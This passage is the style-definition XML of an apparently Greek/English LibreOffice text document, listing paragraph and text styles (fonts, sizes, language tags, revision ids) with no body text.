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775b1d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6540f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el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="00102804" officeooo:paragraph-rsid="0032e442" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-weight-asian="normal" style:font-name-complex="Liberation Serif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el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="0036286f" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-weight-asian="normal" style:font-name-complex="Liberation Serif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el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="0036286f" officeooo:paragraph-rsid="0036286f" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-weight-asian="normal" style:font-name-complex="Liberation Serif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language="en" fo:country="US" fo:font-weight="bold" officeooo:rsid="0031e45d" officeooo:paragraph-rsid="0031e45d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size-asian="12pt" style:font-name-complex="Liberation Serif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5pt" fo:language="en" fo:country="US" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0031e45d" officeooo:paragraph-rsid="0031e45d" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-size-asian="15pt" style:font-style-asian="italic" style:font-name-complex="Liberation Serif" style:font-size-complex="15pt" style:font-style-complex="italic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" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif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3da5df" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif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Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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5867ef" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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5cfc5d" fo:background-color="transparen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775b1d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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144e3b" officeooo:paragraph-rsid="00144e3b" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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144e3b" officeooo:paragraph-rsid="001a01e9" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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37f42d" officeooo:paragraph-rsid="003fc7a1" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif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49562b" officeooo:paragraph-rsid="0049562b" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif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4c9414" officeooo:paragraph-rsid="0050277b" fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif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490efa" officeooo:paragraph-rsid="00490efa" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-name-complex="Calibri1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189c5b" officeooo:paragraph-rsid="00189c5b" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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280171" officeooo:paragraph-rsid="00280171" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12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568d71" officeooo:paragraph-rsid="00568d71" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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5867ef" officeooo:paragraph-rsid="005867ef" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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598971" officeooo:paragraph-rsid="00598971" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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bold" officeooo:rsid="003517be" officeooo:paragraph-rsid="003517be" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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fo:background-color="transparent" style:font-name-asian="Liberation Serif" style:font-size-asian="12pt" style:font-name-complex="Liberation Serif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rsid="00471738" officeooo:paragraph-rsid="00471738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rsid="00144e3b" officeooo:paragraph-rsid="00144e3b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fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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style="italic" fo:font-weight="bold" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-name-complex="Calibri1" style:font-size-complex="12pt" style:font-style-complex="italic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n" fo:country="US" fo:font-weight="normal" officeooo:rsid="00189c5b" officeooo:paragraph-rsid="00189c5b" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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n" fo:country="US" fo:font-weight="normal" officeooo:rsid="0016d0a7" officeooo:paragraph-rsid="001a01e9" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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40pt" fo:font-style="italic" style:text-underline-style="none" officeooo:rsid="000becaa" officeooo:paragraph-rsid="0032e442" style:font-size-asian="40pt" style:font-style-asian="italic" style:font-size-complex="40pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="32pt" fo:language="el" fo:country="GR" fo:font-style="italic" style:text-underline-style="none" officeooo:rsid="001d5c3f" officeooo:paragraph-rsid="0032e442" style:font-size-asian="32pt" style:font-style-asian="italic" style:font-size-complex="32pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="32pt" fo:language="el" fo:country="GR" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001d5c3f" officeooo:paragraph-rsid="0032e442" style:font-size-asian="32pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="32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32pt" fo:language="el" fo:country="GR" fo:font-style="italic" style:text-underline-style="none" officeooo:rsid="0032e442" officeooo:paragraph-rsid="0032e442" style:font-size-asian="28pt" style:font-style-asian="italic" style:font-size-complex="32pt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ize="44pt" fo:font-style="italic" style:text-underline-style="none" officeooo:rsid="000becaa" officeooo:paragraph-rsid="0032e442" style:font-size-asian="44pt" style:font-style-asian="italic" style:font-size-complex="44pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P40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language="el" fo:country="GR" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002d182a" officeooo:paragraph-rsid="002d182a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1a01e9" officeooo:paragraph-rsid="001c3e62" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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245d7c" officeooo:paragraph-rsid="00245d7c" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1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296b3f" officeooo:paragraph-rsid="00296b3f" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P44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2d182a" officeooo:paragraph-rsid="002ef97d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P4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2d182a" officeooo:paragraph-rsid="002b252b" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P46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2d182a" officeooo:paragraph-rsid="002d182a" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P4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2d21de" officeooo:paragraph-rsid="002d182a" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P48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2d21de" officeooo:paragraph-rsid="002ef97d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Calibri1" style:font-size-complex="12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701892" officeooo:paragraph-rsid="00775b1d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-name-complex="Calibri1" style:font-size-complex="12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701892" officeooo:paragraph-rsid="007ad171" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-name-complex="Calibri1" style:font-size-complex="12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bold" officeooo:rsid="002d21de" officeooo:paragraph-rsid="002ef97d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Calibri1" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P52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n" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002d182a" officeooo:paragraph-rsid="002d182a" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P53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n" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="005b39c3" officeooo:paragraph-rsid="005b39c3" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P54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n" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="005cfc5d" officeooo:paragraph-rsid="00775b1d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Calibri1" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5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n" fo:country="US" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="005cfc5d" officeooo:paragraph-rsid="005cfc5d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Calibri1" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P56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n" fo:country="US" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="005cfc5d" officeooo:paragraph-rsid="0074951d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Calibri1" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5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1pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002d182a" officeooo:paragraph-rsid="002d182a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erif1" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" officeooo:paragraph-rsid="003da5df" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" officeooo:paragraph-rsid="00422f69" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" officeooo:paragraph-rsid="00598971" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" officeooo:rsid="001bba5c" officeooo:paragraph-rsid="001c3e62" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" officeooo:rsid="001a01e9" officeooo:paragraph-rsid="001a01e9" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" officeooo:rsid="008845bb" officeooo:paragraph-rsid="008845bb" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="0053ba5f" officeooo:paragraph-rsid="0053ba5f" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="0052ad9b" officeooo:paragraph-rsid="0052ad9b" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="001ec2fe" officeooo:paragraph-rsid="001ec2fe" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="001ec2fe" officeooo:paragraph-rsid="002028b6" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:line-height="100%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="00245d7c" officeooo:paragraph-rsid="00245d7c" style:font-size-asian="12pt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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="002b252b" officeooo:paragraph-rsid="002b252b" style:font-size-asian="12pt" style:font-size-complex="12pt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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" officeooo:rsid="002d182a" officeooo:paragraph-rsid="002d182a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erif1" fo:font-size="12pt" fo:language="el" fo:country="GR" fo:font-weight="bold" officeooo:rsid="00245d7c" officeooo:paragraph-rsid="00245d7c" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties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Liberation Serif1" fo:font-size="12pt" fo:language="en" fo:country="US" style:font-size-asian="12pt" style:font-size-complex="12pt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5cfc5d" officeooo:paragraph-rsid="00775b1d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="005cfc5d" officeooo:paragraph-rsid="005cfc5d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt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5f8eab" officeooo:paragraph-rsid="00775b1d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5cfc5d" officeooo:paragraph-rsid="005cfc5d" fo:background-color="transparent" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Calibri1" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR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fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="003da5df" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="003bde35" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="0045bebb" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="00144e3b" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="0015dd43" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="0016d0a7" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="00263583" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="00598971" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="00901569" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="0092006c" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="003da5df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fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="003bde35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fo:language="el" fo:country="GR" fo:font-weight="normal" officeooo:rsid="00422f69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fo:language="en" fo:country="US" fo:font-weight="normal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fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="003da5df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fo:language="en" fo:country="US" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="003bde35" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="0045bebb" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="00144e3b" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="0015dd43" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="0016d0a7" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="00598971" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="00901569" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Liberation Serif" style:font-name-complex="Liberation Serif"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:font-weight="normal" officeooo:rsid="003bde35" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Liberation Serif" style:font-name-complex="Liberation Serif"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:font-weight="normal" officeooo:rsid="00144e3b" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:color="#0000ff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size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:color="#0000ff" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:language="el" fo:country="GR" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="005cfc5d" style:text-underline-mode="continuous" style:text-overline-mode="continuous" style:text-line-through-mode="continuous" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#0000ff" fo:language="el" fo:country="GR" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="005cfc5d" style:text-underline-mode="continuous" style:text-overline-mode="continuous" style:text-line-through-mode="continuous"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:language="el" fo:country="GR" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00144e3b" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:language="el" fo:country="GR" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001a01e9" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:font-style="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="001a01e9" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002d182a" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002ff1c1" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003029b5" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002d182a" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002ff1c1" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T43" style:family="text"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5b39c3" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T44" style:family="text"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5c564a" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T45" style:family="text"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636341" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T46" style:family="text"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6540ff" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T47" style:family="text"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8ca659" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:letter-spacing="normal" fo:language="el" fo:country="GR" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="008e6514" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="005b39c3" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="005c564a" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00636341" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="006540ff" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" style:font-name="Liberation Serif1" fo:font-size="12pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="008ca659" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-size-asian="12pt" style:font-name-complex="Calibri1" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc3300" fo:letter-spacing="normal" fo:language="el" fo:country="GR" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
